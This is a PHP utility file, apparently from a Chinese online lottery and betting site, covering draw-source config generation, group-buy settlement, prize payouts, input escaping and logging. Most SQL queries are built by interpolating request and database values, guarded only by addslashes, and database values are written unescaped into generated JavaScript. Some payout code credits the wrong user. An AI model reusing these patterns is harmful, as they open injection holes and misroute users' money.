  <div class="complete-sub image"> <span><img src="/images/empty-flat.png" alt=""></span> </div>

                    <div class="complete-sub title">
                        <h4 id="rightTraceListH4">暂无追号记录</h4>
                    </div>


                </div>';

	}
	return $str;

}


function update_kaijiang(){
	global $db;

	$file='../kj/config.js';
	$myfile = fopen($file, "w") or die("Unable to open file!");
	$content="exports.cp=[";

	$list=$db->fetch_all("SELECT  * FROM `game_intface` where `status`='0' ");

	foreach ($list as $value) {
		$game=$db->exec("select * from game_type where ckey='{$value['playkey']}'");

		if($game){

			$url=$value['links'];
			if(strpos($url, '360.cn')!==false){
				$source='360彩票';
				$function='getFrom360CP';

			}

			else if(strpos($url, '1680180.com')!==false){
				$source='168开奖网';
				$function='getFrom168CP';
			}

			else if(strpos($url, 'cailele')!==false){
				$source='彩乐乐';
				$function='getFromxmlCP';
			}

			else if(strpos($url, 'tencent')!==false){
				$source='腾讯';
				$function='getFromTxCP';
			}

			else if(strpos($url, '6vcs')!==false){
				$source='6cvs';
				$function='getFrom6vcsCP';
			}

			else if(strpos($url, 'www.caipiaokong.com')!==false  ){
				$source='彩票控';
				$function='getFromCPKssc';
			}


			else if(strpos($url, 'caipiaokong.com')!==false  and strpos($url, 'json')!==false ){
				$source='彩票控';
				$function='getFromJsonssc';
			}

			else{
				$source='开奖网';
				$function='getFromxmlCP';
			}

			$url=str_replace('https://', "", $url);
			$url=str_replace('http://', "", $url);

			$url1=explode('/', $url);
			$host=$url1[0];
			$path='';
			for($i=1;$i<count($url1);$i++){

				$path.="/".$url1[$i];



			}


			$name=$game['fullname'];
			if($value['Level']) $name.='-'.$value['Level'];
			$timer=$game['ckey'];
			$timer.='-'.$value['Level'];
			$content.="{
		title:'{$name}',
		source:'{$source}',
		name:'{$game['ckey']}',
		enable:true,
		timer:'{$timer}',

			option:{
			host:'{$host}',
			timeout:40000,
			path: '$path',

		},
		parse:function(str){
			try{
				return {$function}(str,'{$game['ckey']}');
			}catch(err){
				throw('{$name}从{$source}解析数据不正确');
			}
		}

		},

		";

		}
	}

	$content.="];";
	$filename = "../kj/temp.js";
	$handle = fopen($filename, "r");//读取二进制文件时，需要将第二个参数设置成'rb'

	//通过filesize获得文件大小，将整个文件一下子读到一个字符串中
	$contents = fread($handle, filesize ($filename));
	fclose($handle);
	fwrite($myfile, $content.$contents);

	fclose($myfile);



}



function  file_write($filename,$content){


	if (file_exists($filename) ){unlink($filename);}
	$file_pointer = fopen($filename,"a+");

	fwrite($file_pointer,$content);
	fclose($file_pointer);

}


function set_game_select($name,$type='get'){
	global $arr_game_code,$db,$_GET,$_POST;
	$str='';

	foreach ($arr_game_code as $key=> $value) {
		$list=$db->fetch_all("select * from game_type where skey='{$key}' and status='0' order by sort asc ");
		if(count($key)>0){
			$str.="<optgroup label='{$value}'>{$value}</optgroup> ";
			foreach ($list as $key1=>$value1) {
				if($type=='get') $name1=$_GET[$name];
				else $name1=$_POST[$name];
				if($name1== $value1['ckey']) $select="selected";
				else $select='';

				$str.="<option value='{$value1['ckey']}' {$select}>{$value1['fullname']}</option>";
			}

		}
	}



	return $str;

}

function BetweenDays ($time1, $time2)
{

	if ($time1 < $time2) {
		$tmp = $time2;
		$time2 = $time1;
		$time1 = $tmp;
	}


	$time1=strtotime(date('Y-m-d',$time1)." 00:00:00");
	$time2=strtotime(date('Y-m-d',$time2)." 00:00:00");

	return ($time1 - $time2) / 86400;
}


function   get_game_ckey($id){
	global $db;
	$row=$db->exec("select * from game_type where id='{$id}'");
	if($row['ckey']) return $row['ckey'];
	else return false;


}
function sys_md5($str){
	return '' === $str ? '' : md5(sha1($str));
}
function  hm_success($id){
	global $db, $con_system;
	$now=time();
	$sql="select * from hemai where id='{$id}' and status='0'";
	$info=$db->exec($sql);
	if($info){
		$hm=$db->exec("select sum(num) as sum from hemai_list where hm_id='{$info['id']}'");
		if(!$hm['sum']) $hm['sum']=0;

		$info['sum1']=$info['sum']-$hm['sum'];
		$num=$hm['sum']+$info['baodi']-$info['sum'];
		$num11=(1-$con_system['hm_sueccss']/100)*$info['sum'];

		if($num>=-$num11){

			$db->query("update hemai set status='1' where id='{$id}'");
			if($num>0){

				$money=$num*$info['premoney'];
				$db->query("update user_bank set `hig_amount`=`hig_amount`+$money where userid='{$_SESSION['userid']}'");
				$ins_id=$db->insert_id();

				$game=$db->exec("select * from game_type where ckey='{$info['playkey']}'");
				$mark='认购满员，退回'.$game['fullname'].'第'.$info['period'].'期保底'.$num."注";

				getsql::banklog($money,"hm_back",$_SESSION['userid'],$mark,$_GET['id'],$info['playkey']);

				$num2=$info['baodi']-$num;
				if($num2>0)
					$db->query("insert into hemai_list(uid,hm_id,num,addtime) values('{$info['uid']}','{$id}','{$num2}','{$now}')");

			}


		}

		else 	{

			if($info['endtime']<=$now){

				$db->query("update hemai set status='-1' where id='{$id}'");
				$money=$info['money1'];
				if($money>0){
					$mark='合买未成功，退回'.$game['fullname'].'第'.$info['period'].'期保底金额';

					if(!$db->exec("SELECT * FROM  `user_bank_log` where userid='{$info['uid']}' and remarks='{$mark}'")){
						$db->query("update user_bank set `hig_amount`=`hig_amount`+$money where userid='{$info['uid']}'");
						$ins_id=$db->insert_id();

						$game=$db->exec("select * from game_type where ckey='{$info['playkey']}'");

						getsql::banklog($money,"hm_back",$info['uid'],$mark,$info['id'],$info['playkey']);
					}

				}
				$list=$db->fetch_all("select * from hemai_list where hm_id='{$id}' order by id asc");

				if(count($list)>0){

					foreach ($list as $value) {

						$money=$value['num']*$info['premoney'];


						$mark='合买未成功，退回'.$game['fullname'].'第'.$info['period'].'期认购金额';


						if(!$db->exec("SELECT * FROM  `user_bank_log` where userid='{$value['uid']}' and remarks='{$mark}'")){
							$db->query("update user_bank set `hig_amount`=`hig_amount`+$money where userid='{$value['uid']}'");


							$game=$db->exec("select * from game_type where ckey='{$info['playkey']}'");

							getsql::banklog($money,"hm_back",$value['uid'],$mark,$value['id'],$info['playkey']);

						}
					}

				}


			}
		}

	}
	return  true;
}

function  hemai_list(){
	global $db;
	$now=time();
	$list=$db->fetch_all("select * from hemai where `status`='0' and endtime<'{$now}'");


	if(count($list)>0){
		foreach ($list as $value) {
			hm_success($value['id']);
		}

	}

	$list=$db->fetch_all("select * from hemai where `status`='1' ");


	if(count($list)>0){
		foreach ($list as $value) {
			$row=$db->exec("select * from game_lottery where playKey='{$value['playkey']}' and period='{$value['period']}'");
			if($row){
				$prize=get_hemai_prize($value['id'],$row['Number']);
				if($value['fee']) $fee=$prize*$value['fee']/100;
				else $fee=0;

				$list1=	$db->fetch_all("select * from hemai_list where hm_id='{$value['id']}'");



				if(count($list1)>0){
					foreach ($list1 as $value1) {

						$money=($prize-$fee)*$value1['num']/$value['sum'];
						if($money>0){
							$db->query("update user_bank set `hig_amount`=`hig_amount`+$money where userid='{$value1['uid']}'");
							$ins_id=$db->insert_id();

							$game=$db->exec("select * from game_type where ckey='{$value['playkey']}'");
							$mark=$game['fullname'].'第'.$value['period'].'期合买中奖';

							getsql::banklog($money,"hig_prize",$value1['uid'],$mark,$value1['id'],$value['playkey']);

							$db->query("update hemai_list set is_prize='1',prize='{$money}' where id='{$value1['id']}'");
						}

					}
				}
				if($fee>0){
					$money=$fee;
					$db->query("update user_bank set `hig_amount`=`hig_amount`+$money where userid='{$value1['uid']}'");
					$ins_id=$db->insert_id();

					$game=$db->exec("select * from game_type where ckey='{$value['playkey']}'");
					$mark=$game['fullname'].'第'.$value['period'].'期合买佣金';

					getsql::banklog($money,"hig_rebate",$value['uid'],$mark,$value['id'],$value['playkey']);


				}

				$db->query("update hemai set status='2' ,prize='{$prize}' where id='{$value['id']}'");
			}
		}

	}

}






function init_task($playkey='',$period='') {

	auto_lot();
	prize_lot($playkey,$period);
	fenpei_prize($playkey,$period);
//	active_buy ();
////	active_unlock ();
	//active_chage_sum ();
//	start_fandian();
	//start_fenhong();
	//	start_wage();
//	fenhong_ps();
	//daili_update();
	clear_user();
	error_orders();
//	hemai_list();
	//delete_lottory();
}


//init_task();


//数据过滤

function data_filtering()
{

	    if (!empty($_GET))
	    {
	        $_GET  = addslashes_deep($_GET);
	    }
	    if (!empty($_POST))
	    {
	        $_POST = addslashes_deep($_POST);
	    }
	 
	    $_COOKIE   = addslashes_deep($_COOKIE);
	    $_REQUEST  = addslashes_deep($_REQUEST);

}



/**
 * 递归方式的对变量中的特殊字符进行转义
 *
 * @access  public
 * @param   mix     $value
 * @author  hankcs
 *
 * @return  mix
 */
function addslashes_deep($value)
{
    if (empty($value))
    {
        return $value;
    }
     
    if(is_array($value))
    {
        foreach((array)$value as $k=>$v)
        {
            unset($value[$k]);
            $k = addslashes($k);
            if(is_array($v))
                $value[$k] = addslashes_deep($v);
            else
                $value[$k] = addslashes($v);
        }
    }
    else
    {
        $value = addslashes($value);
    }
    return $value;
}  
 
/**
 * 将对象成员变量或者数组的特殊字符进行转义
 *
 * @access   public
 * @param    mix        $obj      对象或者数组
 * @author   hankcs
 *
 * @return   mix                  对象或者数组
 */
function addslashes_deep_obj($obj)
{
    if (is_object($obj) == true)
    {
        foreach ($obj AS $key => $val)
        {
            if ( ($val) == true)
            {
                $obj->$key = addslashes_deep_obj($val);
            }
            else
            {
                $obj->$key = addslashes_deep($val);
            }
        }
    }
    else
    {
        $obj = addslashes_deep($obj);
    }
 
    return $obj;
}
 
/**
 * 递归方式的对变量中的特殊字符去除转义
 *
 * @access  public
 * @param   mix     $value
 *
 * @return  mix
 */
function stripslashes_deep($value)
{
    if (empty($value))
    {
        return $value;
    }
     
    if(is_array($value))
    {
        foreach((array)$value as $k=>$v)
        {
            unset($value[$k]);
            $k = stripslashes($k);
            if(is_array($v))
            {
                $value[$k] = stripslashes_deep($v);
            }
            else
            {
                $value[$k] = stripslashes($v);
            }
        }
    }
    else
    {
        $value = stripslashes($value);
    }
    return $value;
}



        /** 
         * 设置session 
         * @param String $name   session name 
         * @param Mixed  $data   session data 
         * @param Int    $expire 超时时间(秒) 
         */  
        function session_set($name, $data, $expire=600){  
            $session_data = array();  
            $session_data['data'] = $data;  
            $session_data['expire'] = time()+$expire;  
            $_SESSION[$name] = $session_data;  
        }  
      
        /** 
         * 读取session 
         * @param  String $name  session name 
         * @return Mixed 
         */  
        function session_get($name){  
            if(isset($_SESSION[$name])){  
                if($_SESSION[$name]['expire']>time()){  
                    return $_SESSION[$name]['data'];  
                }else{  
                    session_clear($name);  
                }  
            }  
            return false;  
        }  
      
        /** 
         * 清除session 
         * @param  String  $name  session name 
         */  
        function session_clear($name){  
            unset($_SESSION[$name]);  
        } 
 


// 查询下级子节点 包含自己
function child_node($value='')
{
	if ($value) {
		global $db;
        $sTemp = '';
        $sTempChd = $value;
        $db->exec("SET GLOBAL group_concat_max_len = 102400");
        
        while ($sTempChd != false || $sTempChd != null){            
            $sTemp .= $sTempChd.',';
            $sql = "SELECT group_concat(userid) as userid FROM `user` where higherid IN(".$sTempChd.")";
            $res = $db->exec($sql);
            $sTempChd = $res['userid'];
        }
        return $sTemp;

		
	}else{
		return false ;
	}
}

function getFileUri($path) {
  	if (substr($path,0,4) == 'http'){
      	return $path;
    }
	if (substr($path,0,1) == '/'){
    	return FILE_URI . $path;
    }else{
    	return FILE_URI . '/' . $path;
    }
}
 

//异常日志
function exception_log($msg)
{
	
        $val = "";
        $currentDateTime  =  date('YmdHis',time());
        $currentDate =  date('Ymd',time());
        $fileName = CHENCY_ROOT ."data/log/".$msg.$currentDate.".txt";//文件名称
        @$data = fopen($fileName,'a+');//添加不覆盖，首先会判断这个文件是否存在，如果不存在，则会创建该文件，即每天都会创建一个新的文件记录的信息
        @$val.= $msg.'|';
        $val.= $currentDateTime;
        @$val.= '|'.getIP().'|'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'|'.$_SESSION['userid'].'|'.PHP_EOL;

        $val.='|GET'.PHP_EOL;
        
        $val.= json_encode($_GET,JSON_UNESCAPED_UNICODE);
        if($_POST){
            $val.= PHP_EOL;
            $val.='|POST'.PHP_EOL;
            $val.= json_encode($_POST,JSON_UNESCAPED_UNICODE);
        }

        
        $val.= PHP_EOL;

        fwrite($data,$val);//写入文本中
        fclose($data);



}

?>
